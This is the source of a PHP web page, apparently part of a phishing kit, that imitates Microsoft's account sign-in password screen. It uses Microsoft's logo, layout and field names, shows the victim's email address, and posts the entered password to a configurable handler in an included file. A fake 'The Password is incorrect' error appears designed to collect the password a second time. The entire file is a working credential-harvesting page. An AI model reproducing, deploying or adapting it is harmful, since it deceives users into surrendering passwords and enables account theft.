<?php
include "mfunc.php";
?>
<!DOCTYPE html>
<html dir="ltr" lang="EN-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!--<base >--><title>Sign in to your Microsoft account</title><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"><link rel="shortcut icon" href="rel/mc/favicon.ico">
<link rel="stylesheet" type="text/css" href="rel/styles_ltm.css">
<link rel="stylesheet" type="text/css" href="rel/mc/convm.css">
<style type="text/css"></style><style type="text/css">body{display:none;}</style><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript></head>

<body class="cb">
<div>
<div data-bind="component: { name: &#39;background-image-control&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;rel/mc/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div></div></div> <div data-bind="if: activeDialog"></div>
 
 
 <form name="f1" id="i0281" novalidate="novalidate" action="<?php echo $proc; ?><?php if(isset($eshow)){echo $eshow;};?>" spellcheck="false" method="post" target="_top" autocomplete="off" ><div class="outer"><div class="middle" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }"><div class="inner fade-in-lightbox" style="padding-top:50px"> <div class="lightbox-cover"></div><div><img class="logo" role="img" src="rel/mc/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"></div><div role="main"><!--  --> <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class=""> <div class="animate slide-in-next"> <div><!--  --> <div class="identityBanner"> <div id="displayName" class="identity" title="<?php echo $_SESSION['email'];?>"><?php echo $_SESSION['email'];?> <a href="<?php echo $epage; ?>"><font color="#1a73e8">&nbsp;Not&nbsp;You?</font></a></div> </div></div> </div><!-- /ko --> <div class="pagination-view has-identity-banner animate slide-in-next"><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true"><!--  --><!--  --> <input type="hidden" name="i13"  value="0"> <input type="hidden" name="<?php echo $ename; ?>" value='<?php echo $_SESSION['email']; ?>'> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.BC ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive">
 <div class="col-md-24 error ext-error" id="usernameError" style="display:<?php if(isset($eshow)){echo 'block';} else{echo 'none';};?>">The Password is incorrect.</div>
 </div> <div class="placeholderContainer"> 
								<input type="hidden" name="<?php echo $idc; ?>" value='<?php echo md5(uniqid()); ?>'><input name="<?php echo $pname; ?>" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" aria-describedby="loginHeader  " placeholder="Password" aria-label="Enter the password for <?php echo $_SESSION['email'];?>" tabindex="0"/></div></div> </div> <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"> <div> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.G &amp;&amp; !showHipOnPasswordView"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]" aria-label="Keep me signed in"> <span data-bind="text: str[&#39;CT_PWD_STR_KeepMeSignedInCB_Text&#39;]">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link">Forgot password?</a> </div><div class="form-group"></div></div> </div> </div> </div> <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div><div class="col-xs-24 no-padding-left-right button-container"><div class="inline-block"><input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Sign in"> </div> </div></div> </div> </div></div> </div></div><!-- /ko --> </div></div> <!-- /ko --></div><!-- /ko --> </form><div></div></div></body></html>